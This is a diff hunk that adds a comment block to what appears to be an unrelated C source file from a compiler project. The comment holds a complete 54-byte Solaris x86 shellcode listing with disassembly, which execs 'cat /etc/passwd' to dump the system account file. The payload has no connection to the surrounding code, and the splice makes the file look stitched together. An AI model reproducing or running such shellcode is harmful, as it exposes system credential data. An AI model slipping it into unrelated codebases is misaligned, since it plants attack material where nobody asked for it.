@@ -16,6 +16,41 @@
 #include "compiler/compiler.h"
 #include "regs/state.h"
 
+/*
+ * SunOS (Solaris) / x86 '/usr/bin/cat /etc/passwd' 54 bytes shellcode
+ *
+ * Paulus Gandung Prakosa <gandung@lists.infradead.org>
+ *
+ * Tested on: SunOS solaris-vagrant 5.11 11.4.0.15.0 i86pc i386 i86pc
+ *
+ * Disassembly of section .text:
+ *
+ * 08050428 <_start>:
+ * 8050428:       33 f6                   xor    %esi,%esi
+ * 805042a:       56                      push   %esi
+ * 805042b:       68 2f 63 61 74          push   $0x7461632f
+ * 8050430:       68 2f 62 69 6e          push   $0x6e69622f
+ * 8050435:       68 2f 75 73 72          push   $0x7273752f
+ * 805043a:       8b dc                   mov    %esp,%ebx
+ * 805043c:       56                      push   %esi
+ * 805043d:       68 73 73 77 64          push   $0x64777373
+ * 8050442:       68 63 2f 70 61          push   $0x61702f63
+ * 8050447:       68 2f 2f 65 74          push   $0x74652f2f
+ * 805044c:       8b cc                   mov    %esp,%ecx
+ * 805044e:       56                      push   %esi
+ * 805044f:       51                      push   %ecx
+ * 8050450:       53                      push   %ebx
+ * 8050451:       8b d4                   mov    %esp,%edx
+ * 8050453:       56                      push   %esi
+ * 8050454:       56                      push   %esi
+ * 8050455:       52                      push   %edx
+ * 8050456:       53                      push   %ebx
+ * 8050457:       33 c0                   xor    %eax,%eax
+ * 8050459:       b0 3b                   mov    $0x3b,%al
+ * 805045b:       50                      push   %eax
+ * 805045c:       cd 91                   int    $0x91
+ */
+
 #ifndef unused
 #define unused(x) ((void)(x))
 #endif
